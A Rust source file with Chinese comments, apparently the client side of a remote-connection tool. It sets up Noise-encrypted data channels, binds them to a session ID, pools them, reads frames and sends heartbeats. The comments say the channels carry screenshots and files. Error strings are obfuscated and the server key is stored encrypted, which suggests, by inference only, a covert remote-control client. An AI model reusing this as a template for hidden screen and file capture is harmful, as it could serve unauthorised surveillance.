//! KikData 连接的 Noise 握手、Kik 绑定、数据读循环和心跳。
//!
//! 每条数据连接独立加密并拥有随机连接 ID，但都绑定当前主连接取得的同一 Kik ID。认证成功后加入连接池，
//! 文件帧可在多条连接间轮询发送；单条断线只降低吞吐，不立即结束主连接。

use crate::context::{Context, Kik};
use crate::read_handle;
use anyhow::Error;
use common::channel::{Channel, ChannelType, DATA_CHANNEL_IO_TIMEOUT};
use common::config::Config;
use common::hidden;
use common::ltc_codec::{
    LengthFieldBasedFrameDecoder, DATA_MAX_FRAME_LENGTH, INIT_MAX_FRAME_LENGTH,
};
use common::message::init_frame::InitFrame;
use common::noise_transport::connect_kik_noise;
use common::protocol::{self, BufSerializable};
use std::sync::Arc;
use std::time::Duration;
use tokio::io::BufReader;
use tokio::sync::Mutex;
use tokio::task::JoinHandle;
use tokio::time;
use tokio::time::timeout;
use tokio_stream::StreamExt;
use tokio_util::codec::FramedRead;
use uuid::Uuid;

/// 建立一条 KikData 连接，等待服务端确认后加入当前 Kik 的连接池。
pub async fn kik_data_conn(
    context: Context,
    expected_kik: Kik,
    config: &Config,
) -> anyhow::Result<JoinHandle<()>> {
    let transport = connect_kik_noise(
        &config.server_host,
        &config.server_port,
        config.read_timeout,
        &common::generated::encrypted_strings::KIK_NOISE_SERVER_PUBLIC_KEY(),
    )
    .await?;
    // Kik 数据通道承载截图和文件内容，帧上限与当前 4 MiB 分片协议保持独立余量。
    let framed_read = FramedRead::new(
        BufReader::new(transport.reader),
        LengthFieldBasedFrameDecoder::new_with_max_frame_len(INIT_MAX_FRAME_LENGTH),
    );
    let framed_arc = Arc::new(Mutex::new(framed_read));

    let channel_arc = Arc::new(Mutex::new(Channel::new(
        transport.writer,
        None,
        ChannelType::Unknown,
        transport.local_addr,
        transport.peer_addr,
    )));
    channel_arc
        .lock()
        .await
        .set_write_timeout(config.write_timeout);

    // 初始化阶段不派生后台读任务：如果监督器此时被取消，reader/writer 会随本 future 一起释放，
    // 不会留下一个无人管理、还要等待六分钟才退出的半初始化连接。
    handle_active(&context, channel_arc.clone()).await?;
    let init_message = {
        let mut framed = framed_arc.lock().await;
        timeout(config.read_timeout, framed.next())
            .await
            .map_err(|_| anyhow::Error::msg(hidden!("等待数据连接初始化响应超时")))?
            .ok_or_else(|| anyhow::Error::msg(hidden!("发送端关闭，连接结束")))??
    };
    let kik_id = match InitFrame::from_buf(init_message) {
        Some(InitFrame::KikId(id)) => id,
        _ => return Err(anyhow::Error::msg(hidden!("数据连接初始化帧格式错误"))),
    };
    let expected_id = context
        .id
        .lock()
        .await
        .clone()
        .ok_or_else(|| anyhow::Error::msg(hidden!("命令连接已结束")))?;
    if kik_id != expected_id {
        return Err(anyhow::Error::msg(hidden!("数据连接返回了不匹配的 Kik ID")));
    }
    {
        let mut guard = channel_arc.lock().await;
        guard.set_id(Uuid::new_v4().to_string());
        guard.channel_type = ChannelType::KikData;
        guard.set_write_timeout(DATA_CHANNEL_IO_TIMEOUT);
    }
    framed_arc
        .lock()
        .await
        .decoder_mut()
        .set_max_frame_len(DATA_MAX_FRAME_LENGTH);
    context
        .insert_data_conn_for(&expected_kik, channel_arc.clone())
        .await?;

    let context_clone = context.clone();
    let inactive_kik = expected_kik.clone();
    let channel = channel_arc.clone();
    let handle = tokio::spawn(async move {
        // 认证完成后才启动业务心跳。读任务结束时显式取消它，避免每轮重连遗留独立小任务。
        let heartbeat_task = tokio::spawn(hearbeat(channel.clone()));
        let error = loop {
            let read_result = {
                let mut framed = framed_arc.lock().await;
                timeout(DATA_CHANNEL_IO_TIMEOUT, framed.next()).await
            };
            match read_result {
                Ok(Some(Ok(msg))) => {
                    if let Err(error) =
                        read_handle::handle_kik_data(&context_clone, channel.clone(), msg).await
                    {
                        break Some(error);
                    }
                }
                Ok(Some(Err(error))) => break Some(error.into()),
                Ok(None) => break None,
                Err(error) => break Some(error.into()),
            }
        };
        heartbeat_task.abort();
        let _ = heartbeat_task.await;
        if let Some(error) = error {
            handle_error(channel.clone(), error).await;
        }
        handle_inactive(&inactive_kik, channel).await;
    });
    Ok(handle)
}

async fn hearbeat(channel: Arc<Mutex<Channel>>) {
    loop {
        time::sleep(Duration::from_secs(5)).await;
        let arc = channel.clone();
        if arc.lock().await.is_closed() {
            return;
        }

        let mut guard = arc.lock().await;
        if guard.channel_type != ChannelType::Unknown {
            match guard.write_and_flush(&protocol::kik_pong()).await {
                Ok(_) => {}
                Err(_) => {
                    // 仅退出心跳任务不会结束仍在等待读取的连接；主动关闭写半边，让服务端回收连接，
                    // 随后的 EOF 会结束本地读任务并触发监督槽位补建。
                    guard.try_write_half_close().await;
                    break;
                }
            };
        }
    }
}

async fn handle_active(context: &Context, channel: Arc<Mutex<Channel>>) -> anyhow::Result<()> {
    let id = context
        .id
        .lock()
        .await
        .clone()
        .ok_or_else(|| anyhow::Error::msg(hidden!("命令连接尚未取得 kik id")))?;
    channel
        .clone()
        .lock()
        .await
        .write_and_flush(&protocol::transfer_encode_frame(InitFrame::KikDataConnReq(
            id,
        )))
        .await
}

async fn handle_inactive(kik: &Kik, c: Arc<Mutex<Channel>>) {
    c.clone().lock().await.try_write_half_close().await;
    // 连接必须从创建它的会话删除，不能让旧连接的迟到回调碰到新主会话。
    kik.delete_data_conn(c).await;
}

async fn handle_error(_channel: Arc<Mutex<Channel>>, _error: Error) {
    dev_debug!("handle_error:{}", _error);
}
